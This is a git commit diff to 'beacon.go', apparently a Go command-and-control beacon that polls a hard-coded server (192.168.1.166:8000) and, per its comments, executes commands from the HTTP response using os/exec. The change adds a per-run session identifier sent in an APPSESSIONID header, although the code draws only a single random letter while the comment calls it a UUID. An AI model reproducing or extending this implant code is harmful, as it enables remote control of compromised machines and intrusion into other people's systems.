7b2ebc176fca92946231bf8df974f68e83f6e88b
matt-culbert <culbertmatt@gmail.com>
2022-11-28 15:56:53 -0500

    Update beacon.go

--- beacon.go
+++ beacon.go
@@ -5,23 +5,29 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"net/http"
 	"os/exec"
 	"strings"
+	"time"
 )
 
 func main() {
 	// to do
-	// generate random uuid of numbers/letters
+	// generate random uuid of numbers/letters [done]
 	// add a user agent with http.requests
 	// execute out from http request [all done]
+
+	rand.Seed(time.Now().UnixNano())         // Seed the randomness
+	charset := "abcdefghijklmnopqrstuvwxyz"  // The charset to draw from
+	uuid := charset[rand.Intn(len(charset))] // Generate the UUID
 
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
 	client := http.Client{}
 	// The request itself, a simple GET to the py server hosting index.html with whoami written
 	// This will need to be changed to a UUID that's generated at each run time
 	req, err := http.NewRequest("GET", "http://192.168.1.166:8000", nil)
-	req.Header.Add("APPSESSIONID", "test")
+	req.Header.Add("APPSESSIONID", string(uuid))
 	resp, err := client.Do(req)
 	if err != nil {
 		log.Fatalln(err)
